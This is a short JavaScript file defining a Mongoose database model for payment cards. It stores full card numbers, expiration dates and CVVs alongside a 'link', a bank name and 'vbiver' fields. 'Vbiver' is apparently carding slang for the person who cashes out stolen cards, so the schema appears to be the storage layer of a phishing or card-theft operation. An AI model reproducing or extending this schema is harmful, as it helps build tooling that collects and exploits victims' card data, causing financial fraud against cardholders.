const mongoose = require('mongoose');

const Cards = new mongoose.Schema({
    link: String,
    bank: String,
    card_number: String,
    card_expiration: String,
    card_cvv: String,
    vbiver: {
        type: String,
        default: 'nothing'
    },

    vbiver_id: {
        type: Number
    }
})

const cards = mongoose.model('cards', Cards);
module.exports = cards;